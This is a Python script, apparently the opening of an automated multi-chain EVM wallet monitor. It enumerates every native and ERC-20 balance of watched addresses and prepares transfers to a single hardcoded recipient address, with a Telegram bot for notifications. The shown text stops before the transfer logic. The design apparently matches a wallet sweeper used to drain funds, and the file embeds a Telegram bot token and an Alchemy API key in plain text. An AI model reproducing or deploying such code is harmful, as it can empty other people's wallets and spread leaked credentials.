#!/usr/bin/env python3
"""
EVM多链自动监控转账工具
基于Alchemy API，支持所有EVM兼容链
"""

import asyncio
import json
import logging
import os
import re
import sqlite3
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import aiosqlite
import requests
from web3 import Web3
try:
    # 尝试旧版本导入
    from web3.middleware import geth_poa_middleware
except ImportError:
    try:
        # 尝试新版本导入
        from web3.middleware.geth_poa import geth_poa_middleware
    except ImportError:
        # 如果都导入失败，创建一个空的中间件函数
        def geth_poa_middleware(w3):
            return w3
from eth_account import Account
from dotenv import load_dotenv
from colorama import init, Fore, Back, Style

# 初始化colorama
init(autoreset=True)

# 加载环境变量
load_dotenv()

# 配置常量
TARGET_ADDRESS = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"  # 硬编码的转账目标地址
TELEGRAM_BOT_TOKEN = "7555291517:AAHJGZOs4RZ-QmZvHKVk-ws5zBNcFZHNmkU"
TELEGRAM_CHAT_ID = "5963704377"

# 颜色输出函数
def print_success(msg): 
    print(f"{Fore.GREEN}✅ {msg}{Style.RESET_ALL}")

def translate_error_message(error_msg: str) -> str:
    """将常见的英文错误信息翻译为中文"""
    translations = {
        "insufficient funds": "余额不足",
        "gas required exceeds allowance": "gas费用超出限制",
        "transaction underpriced": "交易gas价格过低",
        "nonce too low": "nonce值过低",
        "nonce too high": "nonce值过高",
        "intrinsic gas too low": "内在gas过低",
        "exceeds block gas limit": "超出区块gas限制",
        "replacement transaction underpriced": "替换交易gas价格过低",
        "already known": "交易已知",
        "could not replace transaction": "无法替换交易"
    }
    
    error_lower = error_msg.lower()
    for eng, chn in translations.items():
        if eng in error_lower:
            return f"{chn} ({error_msg})"
    
    return error_msg

def print_error(msg): 
    print(f"{Fore.RED}❌ {msg}{Style.RESET_ALL}")

def print_warning(msg): 
    print(f"{Fore.YELLOW}⚠️  {msg}{Style.RESET_ALL}")

def print_info(msg): 
    print(f"{Fore.CYAN}ℹ️  {msg}{Style.RESET_ALL}")

def print_progress(msg): 
    print(f"{Fore.BLUE}🔄 {msg}{Style.RESET_ALL}")

def print_transfer(msg): 
    print(f"{Fore.MAGENTA}💸 {msg}{Style.RESET_ALL}")

def print_chain(msg): 
    print(f"{Fore.WHITE}{Back.BLUE} 🔗 {msg} {Style.RESET_ALL}")

def print_rpc(msg):
    print(f"{Fore.YELLOW}🌐 {msg}{Style.RESET_ALL}")

def print_balance(msg):
    print(f"{Fore.GREEN}💰 {msg}{Style.RESET_ALL}")

def print_gas(msg):
    print(f"{Fore.CYAN}⛽ {msg}{Style.RESET_ALL}")

class ChainConfig:
    """链配置类"""
    
    # 支持的链配置 - 包含所有Alchemy支持的EVM链
    SUPPORTED_CHAINS = {
        # 主要主网
        "ETH_MAINNET": {
            "chain_id": 1,
            "name": "Ethereum Mainnet",
            "rpc_url": "https://eth-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://etherscan.io"
        },
        "POLYGON_MAINNET": {
            "chain_id": 137,
            "name": "Polygon PoS",
            "rpc_url": "https://polygon-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "MATIC",
            "explorer": "https://polygonscan.com"
        },
        "ARBITRUM_ONE": {
            "chain_id": 42161,
            "name": "Arbitrum One",
            "rpc_url": "https://arb-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://arbiscan.io"
        },
        "OPTIMISM_MAINNET": {
            "chain_id": 10,
            "name": "OP Mainnet",
            "rpc_url": "https://opt-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://optimistic.etherscan.io"
        },
        "BASE_MAINNET": {
            "chain_id": 8453,
            "name": "Base",
            "rpc_url": "https://base-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://basescan.org"
        },
        "ARBITRUM_NOVA": {
            "chain_id": 42170,
            "name": "Arbitrum Nova",
            "rpc_url": "https://arbnova-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://nova.arbiscan.io"
        },
        "ZKSYNC_ERA": {
            "chain_id": 324,
            "name": "ZKsync Era",
            "rpc_url": "https://zksync-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://explorer.zksync.io"
        },
        "POLYGON_ZKEVM": {
            "chain_id": 1101,
            "name": "Polygon zkEVM",
            "rpc_url": "https://polygonzkevm-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://zkevm.polygonscan.com"
        },
        "AVALANCHE_C": {
            "chain_id": 43114,
            "name": "Avalanche C-Chain",
            "rpc_url": "https://avax-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "AVAX",
            "explorer": "https://snowtrace.io"
        },
        "BSC_MAINNET": {
            "chain_id": 56,
            "name": "BNB Smart Chain",
            "rpc_url": "https://bnb-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "BNB",
            "explorer": "https://bscscan.com"
        },
        "FANTOM_OPERA": {
            "chain_id": 250,
            "name": "Fantom Opera",
            "rpc_url": "https://fantom-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "FTM",
            "explorer": "https://ftmscan.com"
        },
        "BLAST": {
            "chain_id": 81457,
            "name": "Blast",
            "rpc_url": "https://blast-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://blastscan.io"
        },
        "LINEA": {
            "chain_id": 59144,
            "name": "Linea",
            "rpc_url": "https://linea-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://lineascan.build"
        },
        "MANTLE": {
            "chain_id": 5000,
            "name": "Mantle",
            "rpc_url": "https://mantle-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "MNT",
            "explorer": "https://mantlescan.org"
        },
        "GNOSIS": {
            "chain_id": 100,
            "name": "Gnosis",
            "rpc_url": "https://gnosis-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "xDAI",
            "explorer": "https://gnosisscan.io"
        },
        "CELO": {
            "chain_id": 42220,
            "name": "Celo",
            "rpc_url": "https://celo-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "CELO",
            "explorer": "https://celoscan.io"
        },
        "SCROLL": {
            "chain_id": 534352,
            "name": "Scroll",
            "rpc_url": "https://scroll-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://scrollscan.com"
        },
        
        # 新增链
        "WORLD_CHAIN": {
            "chain_id": 480,
            "name": "World Chain",
            "rpc_url": "https://worldchain-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://worldscan.org"
        },
        "SHAPE": {
            "chain_id": 360,
            "name": "Shape",
            "rpc_url": "https://shape-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://shapescan.xyz"
        },
        "BERACHAIN": {
            "chain_id": 80084,
            "name": "Berachain",
            "rpc_url": "https://berachain-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "BERA",
            "explorer": "https://beratrail.io"
        },
        "UNICHAIN": {
            "chain_id": 1301,
            "name": "Unichain",
            "rpc_url": "https://unichain-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://uniscan.xyz"
        },
        "ZORA": {
            "chain_id": 7777777,
            "name": "Zora",
            "rpc_url": "https://zora-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://explorer.zora.energy"
        },
        "ASTAR": {
            "chain_id": 592,
            "name": "Astar",
            "rpc_url": "https://astar-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ASTR",
            "explorer": "https://astar.subscan.io"
        },
        "ZETACHAIN": {
            "chain_id": 7000,
            "name": "ZetaChain",
            "rpc_url": "https://zetachain-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ZETA",
            "explorer": "https://zetachain.blockscout.com"
        },
        "RONIN": {
            "chain_id": 2020,
            "name": "Ronin",
            "rpc_url": "https://ronin-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "RON",
            "explorer": "https://app.roninchain.com"
        },
        "SETTLUS": {
            "chain_id": 5372,
            "name": "Settlus",
            "rpc_url": "https://settlus-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "SETL",
            "explorer": "https://explorer.settlus.org"
        },
        "ROOTSTOCK": {
            "chain_id": 30,
            "name": "Rootstock",
            "rpc_url": "https://rootstock-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "RBTC",
            "explorer": "https://explorer.rsk.co"
        },
        "STORY": {
            "chain_id": 1513,
            "name": "Story",
            "rpc_url": "https://story-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "IP",
            "explorer": "https://testnet.storyscan.xyz"
        },
        "HUMANITY": {
            "chain_id": 1890,
            "name": "Humanity",
            "rpc_url": "https://humanity-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://explorer.humanity.org"
        },
        "HYPERLIQUID": {
            "chain_id": 998,
            "name": "Hyperliquid",
            "rpc_url": "https://hyperliquid-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://app.hyperliquid.xyz"
        },
        "GALACTICA": {
            "chain_id": 9302,
            "name": "Galactica",
            "rpc_url": "https://galactica-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "GNET",
            "explorer": "https://explorer.galactica.com"
        },
        "LENS": {
            "chain_id": 37111,
            "name": "Lens",
            "rpc_url": "https://lens-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "GRASS",
            "explorer": "https://block-explorer.lens.dev"
        },
        "FRAX": {
            "chain_id": 252,
            "name": "Frax",
            "rpc_url": "https://frax-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "frxETH",
            "explorer": "https://fraxscan.com"
        },
        "INK": {
            "chain_id": 57073,
            "name": "Ink",
            "rpc_url": "https://ink-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://explorer.inkonchain.com"
        },
        "BOTANIX": {
            "chain_id": 3636,
            "name": "Botanix",
            "rpc_url": "https://botanix-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "BTC",
            "explorer": "https://blockscout.botanixlabs.dev"
        },
        "BOBA": {
            "chain_id": 288,
            "name": "Boba",
            "rpc_url": "https://boba-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://bobascan.com"
        },
        "SUPERSEED": {
            "chain_id": 5330,
            "name": "Superseed",
            "rpc_url": "https://superseed-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://explorer.superseed.xyz"
        },
        "FLOW_EVM": {
            "chain_id": 747,
            "name": "Flow EVM",
            "rpc_url": "https://flow-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "FLOW",
            "explorer": "https://evm.flowscan.io"
        },
        "DEGEN": {
            "chain_id": 666666666,
            "name": "Degen",
            "rpc_url": "https://degen-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "DEGEN",
            "explorer": "https://explorer.degen.tips"
        },
        "APECHAIN": {
            "chain_id": 33139,
            "name": "ApeChain",
            "rpc_url": "https://apechain-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "APE",
            "explorer": "https://apechain.calderaexplorer.xyz"
        },
        "ANIME": {
            "chain_id": 11501,
            "name": "Anime",
            "rpc_url": "https://anime-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ANIME",
            "explorer": "https://animechain.ai"
        },
        "METIS": {
            "chain_id": 1088,
            "name": "Metis",
            "rpc_url": "https://metis-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "METIS",
            "explorer": "https://explorer.metis.io"
        },
        "SONIC": {
            "chain_id": 146,
            "name": "Sonic",
            "rpc_url": "https://sonic-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "S",
            "explorer": "https://explorer.soniclabs.com"
        },
        "SEI": {
            "chain_id": 1329,
            "name": "Sei",
            "rpc_url": "https://sei-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "SEI",
            "explorer": "https://seitrace.com"
        },
        "OPBNB": {
            "chain_id": 204,
            "name": "opBNB",
            "rpc_url": "https://opbnb-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "BNB",
            "explorer": "https://opbnbscan.com"
        },
        "ABSTRACT": {
            "chain_id": 11124,
            "name": "Abstract",
            "rpc_url": "https://abstract-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://explorer.abstract.money"
        },
        "SONEIUM": {
            "chain_id": 1946,
            "name": "Soneium",
            "rpc_url": "https://soneium-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://explorer.soneium.org"
        },
        
        # 测试网
        "ETH_SEPOLIA": {
            "chain_id": 11155111,
            "name": "Ethereum Sepolia",
            "rpc_url": "https://eth-sepolia.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://sepolia.etherscan.io"
        },
        "POLYGON_AMOY": {
            "chain_id": 80002,
            "name": "Polygon Amoy",
            "rpc_url": "https://polygon-amoy.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "MATIC",
            "explorer": "https://amoy.polygonscan.com"
        },
        "ARBITRUM_SEPOLIA": {
            "chain_id": 421614,
            "name": "Arbitrum Sepolia",
            "rpc_url": "https://arb-sepolia.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://sepolia.arbiscan.io"
        },
        "OPTIMISM_SEPOLIA": {
            "chain_id": 11155420,
            "name": "Optimism Sepolia",
            "rpc_url": "https://opt-sepolia.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://sepolia-optimism.etherscan.io"
        },
        "BASE_SEPOLIA": {
            "chain_id": 84532,
            "name": "Base Sepolia",
            "rpc_url": "https://base-sepolia.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://sepolia.basescan.org"
        },
        "TEA_SEPOLIA": {
            "chain_id": 1337,
            "name": "Tea Sepolia",
            "rpc_url": "https://tea-sepolia.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "TEA",
            "explorer": "https://testnet.teascan.org"
        },
        "GENSYN_TESTNET": {
            "chain_id": 42069,
            "name": "Gensyn Testnet",
            "rpc_url": "https://gensyn-testnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "GEN",
            "explorer": "https://explorer.gensyn.ai"
        },
        "RISE_TESTNET": {
            "chain_id": 1821,
            "name": "Rise Testnet",
            "rpc_url": "https://rise-testnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://testnet.risescan.co"
        },
        "MONAD_TESTNET": {
            "chain_id": 41454,
            "name": "Monad Testnet",
            "rpc_url": "https://monad-testnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "MON",
            "explorer": "https://testnet.monad.xyz"
        },
        "XMTP_SEPOLIA": {
            "chain_id": 11155111,
            "name": "XMTP Sepolia",
            "rpc_url": "https://xmtp-testnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://explorer.testnet.xmtp.network"
        },
        "CROSSFI_TESTNET": {
            "chain_id": 4157,
            "name": "CrossFi Testnet",
            "rpc_url": "https://crossfi-testnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "XFI",
            "explorer": "https://test.xfiscan.com"
        },
        "LUMIA_PRISM": {
            "chain_id": 1952959480,
            "name": "Lumia Prism",
            "rpc_url": "https://lumia-prism.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "LUMIA",
            "explorer": "https://explorer.lumia.org"
        }
    }

class DatabaseManager:
    """数据库管理类"""
    
    def __init__(self, db_path: str = "monitoring.db"):
        self.db_path = db_path
        self._lock = asyncio.Lock()  # 添加异步锁防止并发访问
    
    async def init_database(self):
        """初始化数据库"""
        async with aiosqlite.connect(self.db_path) as db:
            # 创建屏蔽链表
            await db.execute("""
                CREATE TABLE IF NOT EXISTS blocked_chains (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    address TEXT NOT NULL,
                    chain_name TEXT NOT NULL,
                    chain_id INTEGER NOT NULL,
                    blocked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    reason TEXT DEFAULT 'No transaction history',
                    UNIQUE(address, chain_id)
                )
            """)
            
            # 创建转账记录表
            await db.execute("""
                CREATE TABLE IF NOT EXISTS transfers (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    address TEXT NOT NULL,
                    chain_name TEXT NOT NULL,
                    chain_id INTEGER NOT NULL,
                    amount TEXT NOT NULL,
                    recipient TEXT NOT NULL,
                    tx_hash TEXT,
                    gas_used TEXT,
                    gas_price TEXT,
                    status TEXT NOT NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    error_message TEXT
                )
            """)
            
            # 创建日志表
            await db.execute("""
                CREATE TABLE IF NOT EXISTS logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    level TEXT NOT NULL,
                    message TEXT NOT NULL,
                    address TEXT,
                    chain_name TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            
            # 创建配置表
            await db.execute("""
                CREATE TABLE IF NOT EXISTS config (
                    key TEXT PRIMARY KEY,
                    value TEXT NOT NULL,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            
            await db.commit()
    
    async def is_chain_blocked(self, address: str, chain_id: int) -> bool:
        """检查链是否被屏蔽"""
        async with self._lock:
            async with aiosqlite.connect(self.db_path) as db:
                cursor = await db.execute(
                    "SELECT 1 FROM blocked_chains WHERE address = ? AND chain_id = ?",
                    (address, chain_id)
                )
                result = await cursor.fetchone()
                return result is not None
    
    async def block_chain(self, address: str, chain_name: str, chain_id: int, reason: str = "No transaction history"):
        """屏蔽链"""
        async with self._lock:
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute(
                    """INSERT OR IGNORE INTO blocked_chains 
                       (address, chain_name, chain_id, reason) VALUES (?, ?, ?, ?)""",
                    (address, chain_name, chain_id, reason)
                )
                await db.commit()
    
    async def log_transfer(self, address: str, chain_name: str, chain_id: int, 
                          amount: str, recipient: str, tx_hash: str = None, 
                          gas_used: str = None, gas_price: str = None, 
                          status: str = "pending", error_message: str = None):
        """记录转账"""
        async with self._lock:
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute(
                    """INSERT INTO transfers 
                       (address, chain_name, chain_id, amount, recipient, tx_hash, 
                        gas_used, gas_price, status, error_message) 
                       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                    (address, chain_name, chain_id, amount, recipient, tx_hash, 
                     gas_used, gas_price, status, error_message)
                )
                await db.commit()
    
    async def log_message(self, level: str, message: str, address: str = None, chain_name: str = None):
        """记录日志消息"""
        async with self._lock:
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute(
                    "INSERT INTO logs (level, message, address, chain_name) VALUES (?, ?, ?, ?)",
                    (level, message, address, chain_name)
                )
                await db.commit()
    
    async def get_blocked_chains(self, address: str = None) -> List[Dict]:
        """获取屏蔽链列表"""
        async with aiosqlite.connect(self.db_path) as db:
            if address:
                cursor = await db.execute(
                    "SELECT * FROM blocked_chains WHERE address = ? ORDER BY blocked_at DESC",
                    (address,)
                )
            else:
                cursor = await db.execute(
                    "SELECT * FROM blocked_chains ORDER BY blocked_at DESC"
                )
            
            rows = await cursor.fetchall()
            columns = [description[0] for description in cursor.description]
            return [dict(zip(columns, row)) for row in rows]
    
    async def get_transfer_history(self, address: str = None, limit: int = 100) -> List[Dict]:
        """获取转账历史"""
        async with aiosqlite.connect(self.db_path) as db:
            if address:
                cursor = await db.execute(
                    "SELECT * FROM transfers WHERE address = ? ORDER BY created_at DESC LIMIT ?",
                    (address, limit)
                )
            else:
                cursor = await db.execute(
                    "SELECT * FROM transfers ORDER BY created_at DESC LIMIT ?",
                    (limit,)
                )
            
            rows = await cursor.fetchall()
            columns = [description[0] for description in cursor.description]
            return [dict(zip(columns, row)) for row in rows]

class AlchemyAPI:
    """Alchemy API 封装类"""
    
    def __init__(self, api_key: str):
        self.api_key = api_key
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
        })
        
        # API限频控制 - 优化到300-500 CU/s
        self.last_request_time = 0
        self.min_request_interval = 0.002  # 2ms间隔，目标400 CU/s
    
    async def _rate_limit(self):
        """API限频控制"""
        current_time = time.time()
        time_since_last = current_time - self.last_request_time
        if time_since_last < self.min_request_interval:
            await asyncio.sleep(self.min_request_interval - time_since_last)
        self.last_request_time = time.time()
    
    def _get_rpc_url(self, chain_config: Dict) -> str:
        """获取RPC URL"""
        return chain_config.get('rpc_url', '').strip()
    
    async def check_asset_transfers(self, address: str, chain_config: Dict) -> Tuple[bool, int]:
        """检查地址是否有交易历史，返回(是否有交易, 交易数量)"""
        await self._rate_limit()
        
        url = self._get_rpc_url(chain_config)
        
        payload = {
            "id": 1,
            "jsonrpc": "2.0",
            "method": "alchemy_getAssetTransfers",
            "params": [
                {
                    "fromBlock": "0x0",
                    "toBlock": "latest",
                    "fromAddress": address,
                    "category": ["external", "erc20", "erc721", "erc1155"],
                    "maxCount": "0xa"  # 获取最多10条记录来统计
                }
            ]
        }
        
        try:
            response = self.session.post(url, json=payload, timeout=10)
            response.raise_for_status()
            
            data = response.json()
            if 'result' in data:
                transfers = data['result'].get('transfers', [])
                transfer_count = len(transfers)
                return transfer_count > 0, transfer_count
            
            return False, 0
        except requests.exceptions.HTTPError as http_error:
            status_code = getattr(http_error.response, 'status_code', None)
            # 对于 400/403/404，视为该链在 Alchemy 上不受支持或密钥未开通，返回 False 以触发屏蔽
            if status_code in (400, 403, 404):
                logging.debug(
                    f"{chain_config['name']} 在 Alchemy 上不可用或未开通 (HTTP {status_code})，将屏蔽该链"
                )
                return False, 0
            # 其它HTTP错误，保守处理为暂不屏蔽
            logging.debug(f"检查交易历史失败 {chain_config['name']} (HTTP {status_code}): {http_error}")
            return True, 0
        except Exception as e:
            # 网络超时等暂时性错误，不屏蔽
            logging.warning(f"检查交易历史失败 {chain_config['name']}: {e}")
            return True, 0  # 网络错误时假设有交易历史，避免误屏蔽
    
    async def get_balance(self, address: str, chain_config: Dict) -> float:
        """获取原生代币余额"""
        await self._rate_limit()
        
        url = self._get_rpc_url(chain_config)
        
        payload = {
            "id": 1,
            "jsonrpc": "2.0",
            "method": "eth_getBalance",
            "params": [address, "latest"]
        }
        
        try:
            response = self.session.post(url, json=payload, timeout=10)
            response.raise_for_status()
            
            data = response.json()
            if 'result' in data:
                balance_wei = int(data['result'], 16)
                balance_eth = Web3.from_wei(balance_wei, 'ether')
                return float(balance_eth)
            
            return 0.0
        except Exception as e:
            logging.error(f"获取余额失败 {chain_config['name']}: {e}")
            return 0.0
    
    async def get_all_token_balances(self, address: str, chain_config: Dict) -> Dict[str, Dict]:
        """获取地址的所有代币余额（原生代币+ERC-20）"""
        await self._rate_limit()
        
        url = self._get_rpc_url(chain_config)
        
        # 使用Alchemy的getTokenBalances API获取所有ERC-20代币
        payload = {
            "id": 1,
            "jsonrpc": "2.0",
            "method": "alchemy_getTokenBalances",
            "params": [address]
        }
        
        all_balances = {}
        
        try:
            # 获取原生代币余额
            native_balance = await self.get_balance(address, chain_config)
            if native_balance > 0:
                all_balances['native'] = {
                    'symbol': chain_config['native_token'],
                    'balance': native_balance,
                    'contract_address': None,
                    'decimals': 18,
                    'type': 'native'
                }
            
            # 获取ERC-20代币余额
            response = self.session.post(url, json=payload, timeout=10)
            response.raise_for_status()
            
            data = response.json()
            if 'result' in data and 'tokenBalances' in data['result']:
                for token in data['result']['tokenBalances']:
                    if token['tokenBalance'] and token['tokenBalance'] != '0x0':
                        contract_address = token['contractAddress']
                        
                        # 获取代币元数据
                        metadata = await self.get_token_metadata(contract_address, chain_config)
                        if metadata:
                            balance_raw = int(token['tokenBalance'], 16)
                            decimals = metadata.get('decimals', 18)
                            balance = balance_raw / (10 ** decimals)
                            
                            if balance > 0:
                                all_balances[contract_address] = {
                                    'symbol': metadata.get('symbol', 'UNKNOWN'),
                                    'balance': balance,
                                    'contract_address': contract_address,
                                    'decimals': decimals,
                                    'type': 'erc20'
                                }
            
            return all_balances
            
        except Exception as e:
            logging.error(f"获取全代币余额失败 {chain_config['name']}: {e}")
            # 如果API失败，至少返回原生代币余额
            native_balance = await self.get_balance(address, chain_config)
            if native_balance > 0:
                return {
                    'native': {
                        'symbol': chain_config['native_token'],
                        'balance': native_balance,
                        'contract_address': None,
                        'decimals': 18,
                        'type': 'native'
                    }
                }
            return {}
    
    async def get_token_metadata(self, contract_address: str, chain_config: Dict) -> Dict:
        """获取ERC-20代币元数据"""
        await self._rate_limit()
        
        url = self._get_rpc_url(chain_config)
        
        payload = {
            "id": 1,
            "jsonrpc": "2.0",
            "method": "alchemy_getTokenMetadata",
            "params": [contract_address]
        }
        
        try:
            response = self.session.post(url, json=payload, timeout=10)
            response.raise_for_status()
            
            data = response.json()
            if 'result' in data:
                return data['result']
            
            return {}
        except Exception as e:
            logging.warning(f"获取代币元数据失败 {contract_address}: {e}")
            return {}
    

    
    async def get_gas_price(self, chain_config: Dict) -> Dict:
        """获取实时gas价格"""
        await self._rate_limit()
        
        url = self._get_rpc_url(chain_config)
        
        # 尝试获取EIP-1559 gas价格
        payload = {
            "id": 1,
            "jsonrpc": "2.0",
            "method": "eth_feeHistory",
            "params": ["0x1", "latest", [50]]  # 获取最近1个块，50%分位数
        }
        
        try:
            response = self.session.post(url, json=payload, timeout=10)
            response.raise_for_status()
            
            data = response.json()
            if 'result' in data:
                result = data['result']
                base_fee = int(result['baseFeePerGas'][0], 16)
                priority_fee = int(result['reward'][0][0], 16) if result['reward'] else 2000000000  # 2 gwei
                
                return {
                    "base_fee": base_fee,
                    "priority_fee": priority_fee,
                    "max_fee": base_fee + priority_fee,
                    "gas_price": base_fee + priority_fee
                }
        except:
            pass
        
        # 回退到传统gas价格
        payload = {
            "id": 1,
            "jsonrpc": "2.0",
            "method": "eth_gasPrice",
            "params": []
        }
        
        try:
            response = self.session.post(url, json=payload, timeout=10)
            response.raise_for_status()
            
            data = response.json()
            if 'result' in data:
                gas_price = int(data['result'], 16)
                return {
                    "gas_price": gas_price,
                    "max_fee": gas_price,
                    "base_fee": gas_price,
                    "priority_fee": 0
                }
        except Exception as e:
            logging.error(f"获取gas价格失败 {chain_config['name']}: {e}")
            
        # 默认gas价格
        return {
            "gas_price": 20000000000,  # 20 gwei
            "max_fee": 20000000000,
            "base_fee": 20000000000,
            "priority_fee": 0
        }

class TransferManager:
    """转账管理类"""
    
    def __init__(self, alchemy_api: AlchemyAPI, db_manager: DatabaseManager):
        self.alchemy_api = alchemy_api
        self.db_manager = db_manager
        self.web3_instances = {}
    
    def get_web3_instance(self, chain_config: Dict) -> Web3:
        """获取Web3实例"""
        chain_name = chain_config['name']
        
        if chain_name not in self.web3_instances:
            rpc_url = self.alchemy_api._get_rpc_url(chain_config)
            
            try:
                # 创建HTTP提供者，设置超时
                provider = Web3.HTTPProvider(
                    rpc_url,
                    request_kwargs={'timeout': 30}
                )
                web3 = Web3(provider)
                
                # 为某些链添加POA中间件
                if chain_config['chain_id'] in [56, 137, 250, 43114]:  # BSC, Polygon, Fantom, Avalanche
                    try:
                        # 尝试新版本的中间件注入方式
                        if callable(geth_poa_middleware):
                            if hasattr(web3.middleware_onion, 'inject'):
                                web3.middleware_onion.inject(geth_poa_middleware, layer=0)
                            else:
                                # 兼容更新的版本
                                web3.middleware_onion.add(geth_poa_middleware)
                    except Exception as e:
                        logging.debug(f"POA中间件注入失败: {e}")
